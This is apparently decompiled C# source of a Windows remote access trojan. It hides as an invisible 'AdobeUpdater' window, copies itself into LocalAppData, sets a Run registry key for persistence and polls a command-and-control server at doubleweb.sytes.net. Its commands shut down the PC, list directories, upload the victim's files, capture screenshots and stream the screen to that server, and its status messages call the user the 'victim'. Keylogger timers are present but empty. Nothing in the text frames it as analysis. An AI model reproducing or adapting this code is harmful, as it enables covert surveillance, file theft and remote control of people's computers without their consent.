using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using csrss.My;

namespace csrss;

[DesignerGenerated]
public class form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("keylogger")]
	private Timer _keylogger;

	[AccessedThroughProperty("wait_command")]
	private Timer _wait_command;

	[AccessedThroughProperty("uptime")]
	private Timer _uptime;

	[AccessedThroughProperty("remote_view")]
	private Timer _remote_view;

	[AccessedThroughProperty("keylogger_send")]
	private Timer _keylogger_send;

	private const int APPCOMMAND_VOLUME_MUTE = 524288;

	private const int APPCOMMAND_VOLUME_UP = 655360;

	private const int APPCOMMAND_VOLUME_DOWN = 589824;

	private const int WM_APPCOMMAND = 793;

	public string host;

	public int screen_rec_frame;

	internal virtual Timer keylogger
	{
		get
		{
			return _keylogger;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_keylogger != null)
			{
				_keylogger.remove_Tick(eventHandler);
			}
			_keylogger = value;
			if (_keylogger != null)
			{
				_keylogger.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer wait_command
	{
		get
		{
			return _wait_command;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = wait_command_Tick;
			if (_wait_command != null)
			{
				_wait_command.remove_Tick(eventHandler);
			}
			_wait_command = value;
			if (_wait_command != null)
			{
				_wait_command.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer uptime
	{
		get
		{
			return _uptime;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = uptime_Tick;
			if (_uptime != null)
			{
				_uptime.remove_Tick(eventHandler);
			}
			_uptime = value;
			if (_uptime != null)
			{
				_uptime.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer remote_view
	{
		get
		{
			return _remote_view;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = remote_view_Tick;
			if (_remote_view != null)
			{
				_remote_view.remove_Tick(eventHandler);
			}
			_remote_view = value;
			if (_remote_view != null)
			{
				_remote_view.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer keylogger_send
	{
		get
		{
			return _keylogger_send;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = keylogger_send_Tick;
			if (_keylogger_send != null)
			{
				_keylogger_send.remove_Tick(eventHandler);
			}
			_keylogger_send = value;
			if (_keylogger_send != null)
			{
				_keylogger_send.add_Tick(eventHandler);
			}
		}
	}

	public string data
	{
		get
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(url);
				WebResponse response = webRequest.GetResponse();
				StreamReader streamReader = new StreamReader(response.GetResponseStream());
				return streamReader.ReadToEnd();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "down_server";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public form1()
	{
		((Form)this).add_Load((EventHandler)form1_Load);
		host = "http://doubleweb.sytes.net/proiecte/dwmz/api.php";
		screen_rec_frame = 0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		components = new Container();
		keylogger = new Timer(components);
		wait_command = new Timer(components);
		uptime = new Timer(components);
		remote_view = new Timer(components);
		keylogger_send = new Timer(components);
		((Control)this).SuspendLayout();
		keylogger.set_Interval(75);
		wait_command.set_Interval(3000);
		uptime.set_Enabled(true);
		uptime.set_Interval(120000);
		remote_view.set_Interval(85);
		keylogger_send.set_Interval(15000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(116, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("AdobeUpdater");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32.dll")]
	public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	private void Timer1_Tick(object sender, EventArgs e)
	{
	}

	private void form1_Load(object sender, EventArgs e)
	{
		if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
		{
			Application.Exit();
		}
		int iLength = 5;
		string text = GenerateRandomString(ref iLength);
		string executablePath = Application.get_ExecutablePath();
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/" + text + ".exe";
		File.Copy(executablePath, text2);
		RegistryKey localMachine = Registry.LocalMachine;
		RegistryKey registryKey = localMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(text + ".exe", text2);
		try
		{
			string executablePath2 = Application.get_ExecutablePath();
			List<string> list = new List<string>(executablePath2.Split(new char[1] { '\\' }));
			string name = list[checked(list.Count - 1)];
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			registryKey2.DeleteValue(name, throwOnMissingValue: false);
			registryKey2.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		wait_command.Start();
	}

	public string GenerateRandomString(ref int iLength)
	{
		Random random = new Random();
		char[] array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray();
		string text = "";
		checked
		{
			int num = iLength - 1;
			for (int i = 0; i <= num; i++)
			{
				text += Conversions.ToString(array[random.Next(0, array.Length)]);
			}
			return text;
		}
	}

	public bool done_command(string command, string response)
	{
		WebClient webClient = new WebClient();
		webClient.Headers["content-type"] = "application/x-www-form-urlencoded";
		string text = webClient.UploadString(host + "?do=response&vid=" + vid(), "command=" + Uri.EscapeDataString(command) + "&response=" + Uri.EscapeDataString(response));
		if (Operators.CompareString(text, "ok", false) == 0)
		{
			return true;
		}
		return false;
	}

	public string vid()
	{
		return SystemInformation.get_UserName() + "_" + SystemInformation.get_ComputerName();
	}

	public object post_to_server(string url, string method, string data)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = method;
			byte[] bytes = Encoding.UTF8.GetBytes(data);
			webRequest.ContentType = "application/x-www-form-urlencoded";
			webRequest.ContentLength = bytes.Length;
			Stream requestStream = webRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = webRequest.GetResponse();
			requestStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(requestStream);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			requestStream.Close();
			response.Close();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text = Conversion.ErrorToString();
			if (Operators.CompareString(text, "Invalid URI: The format of the URI could not be determined.", false) == 0)
			{
			}
			object result2 = "ERROR";
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private void wait_command_Tick(object sender, EventArgs e)
	{
		//IL_0553: Unknown result type (might be due to invalid IL or missing references)
		//IL_055a: Expected O, but got Unknown
		switch (this.get_data(host + "?do=get_command&vid=" + vid()))
		{
		case "shutdown_pc":
			wait_command.Stop();
			done_command("shutdown_pc", "Calculatorul victimei se inchide..");
			Process.Start("shutdown", "-s -t 00");
			break;
		case "restart_pc":
			wait_command.Stop();
			done_command("restart_pc", "Calculatorul victimei se restarteaza..");
			Process.Start("shutdown", "-r -t 00");
			break;
		case "keylogger_on":
			break;
		case "keylogger_off":
			break;
		case "cd_open":
			wait_command.Stop();
			cmdOpen_Click();
			done_command("cd_open", "CD-ul a fost deschis cu succes");
			wait_command.Start();
			break;
		case "cd_close":
			wait_command.Stop();
			cmdClose_Click();
			done_command("cd_close", "CD-ul a fost inchis cu succes");
			wait_command.Start();
			break;
		case "control_volume_up":
		{
			wait_command.Stop();
			IntPtr handle3 = ((Control)this).get_Handle();
			IntPtr handle4 = ((Control)this).get_Handle();
			IntPtr lParam = new IntPtr(655360);
			SendMessageW(handle3, 793, handle4, lParam);
			done_command("control_volume_up", "Volumul a crescu cu succes");
			wait_command.Start();
			break;
		}
		case "control_volume_down":
		{
			wait_command.Stop();
			IntPtr handle5 = ((Control)this).get_Handle();
			IntPtr handle6 = ((Control)this).get_Handle();
			IntPtr lParam = new IntPtr(589824);
			SendMessageW(handle5, 793, handle6, lParam);
			done_command("control_volume_down", "Volumul s-a micsorat cu succes");
			wait_command.Start();
			break;
		}
		case "control_volume_mute":
		{
			wait_command.Stop();
			IntPtr handle = ((Control)this).get_Handle();
			IntPtr handle2 = ((Control)this).get_Handle();
			IntPtr lParam = new IntPtr(524288);
			SendMessageW(handle, 793, handle2, lParam);
			done_command("control_volume_mute", "Volumul a fost comutat pe mute");
			wait_command.Start();
			break;
		}
		case "directory_viewer":
		{
			wait_command.Stop();
			string text2 = this.get_data(host + "?do=get_param&vid=" + vid());
			if (Operators.CompareString(text2, "down_server", false) != 0)
			{
				string text3 = "";
				if (File.Exists(text2) | Directory.Exists(text2))
				{
					string[] directories = Directory.GetDirectories(text2);
					foreach (string text4 in directories)
					{
						text3 = text3 + text4 + "<br/>";
					}
					DirectoryInfo directoryInfo = new DirectoryInfo(text2);
					FileInfo[] files = directoryInfo.GetFiles();
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						text3 = text3 + fileInfo.get_Name() + "<br/>";
					}
				}
				else
				{
					text3 = "404_error_to_file";
				}
				post_to_server(host + "?do=deliver_filelist&vid=" + vid(), "POST", "files=" + text3 + "&command=" + text2);
				done_command("directory_viewer", "Directoarele au fost afisate cu succes");
			}
			wait_command.Start();
			break;
		}
		case "remote_view_start":
			wait_command.Stop();
			done_command("remote_view_start", "Vizionarea victimei a inceput..");
			wait_command.Start();
			remote_view.Start();
			break;
		case "remote_view_stop":
			wait_command.Stop();
			done_command("remote_view_stop", "Vizionarea victimei a luat sfarsit.");
			remote_view.Stop();
			wait_command.Start();
			break;
		case "upload_file":
		{
			wait_command.Stop();
			string text = this.get_data(host + "?do=get_param&vid=" + vid());
			((ServerComputer)MyProject.Computer).get_Network().UploadFile(text, host + "?do=upload_file&vid=" + vid());
			done_command("upload_file", "Extragerea fisierului din calculatorul victimei, s-a efectuat cu succes.");
			wait_command.Start();
			break;
		}
		case "cmd_exec":
			wait_command.Stop();
			this.get_data(host + "?do=get_param&vid=" + vid());
			wait_command.Start();
			break;
		case "capture_screen":
		{
			wait_command.Stop();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)139273);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			Cursor cursor = ((Control)this).get_Cursor();
			Point location = checked(new Point(Cursor.get_Position().X - ((Control)this).get_Cursor().get_HotSpot().X, Cursor.get_Position().Y - ((Control)this).get_Cursor().get_HotSpot().Y));
			Rectangle rectangle = new Rectangle(location, ((Control)this).get_Cursor().get_Size());
			cursor.Draw(val2, rectangle);
			((Image)val).Save(folderPath + "/dcap.jpg", ImageFormat.get_Jpeg());
			((ServerComputer)MyProject.Computer).get_Network().UploadFile(folderPath + "/dcap.jpg", host + "?do=upload_capture&vid=" + vid());
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath + "/dcap.jpg");
			done_command("capture_screen", "S-a preluat screenshootul cu succes !");
			wait_command.Start();
			break;
		}
		case "down_server":
			wait_command.set_Interval(7000);
			break;
		}
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, long uReturnLength, long hwndCallback);

	private void cmdOpen_Click()
	{
		string lpstrCommand = "set CDAudio door open";
		string lpstrReturnString = Conversions.ToString(0);
		mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 127L, 0L);
	}

	private void cmdClose_Click()
	{
		string lpstrCommand = "set CDAudio door closed";
		string lpstrReturnString = Conversions.ToString(0);
		mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 127L, 0L);
	}

	private void uptime_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.get_data(host + "?do=uptime_monitor&vid=" + vid()), "ok", false) == 0)
		{
		}
	}

	private void remote_view_Tick(object sender, EventArgs e)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		remote_view.set_Enabled(false);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)135173);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(0, 0, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
		Cursor cursor = ((Control)this).get_Cursor();
		checked
		{
			Point location = new Point(Cursor.get_Position().X - ((Control)this).get_Cursor().get_HotSpot().X, Cursor.get_Position().Y - ((Control)this).get_Cursor().get_HotSpot().Y);
			Rectangle rectangle = new Rectangle(location, ((Control)this).get_Cursor().get_Size());
			cursor.Draw(val2, rectangle);
			((Image)val).Save(folderPath + "/rec" + Conversions.ToString(screen_rec_frame) + ".jpg", ImageFormat.get_Jpeg());
			((ServerComputer)MyProject.Computer).get_Network().UploadFile(folderPath + "/rec" + Conversions.ToString(screen_rec_frame) + ".jpg", host + "?do=upload_screen_rec&vid=" + vid());
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath + "/rec" + Conversions.ToString(screen_rec_frame) + ".jpg");
			screen_rec_frame++;
			remote_view.set_Enabled(true);
		}
	}

	private void keylogger_send_Tick(object sender, EventArgs e)
	{
	}
}
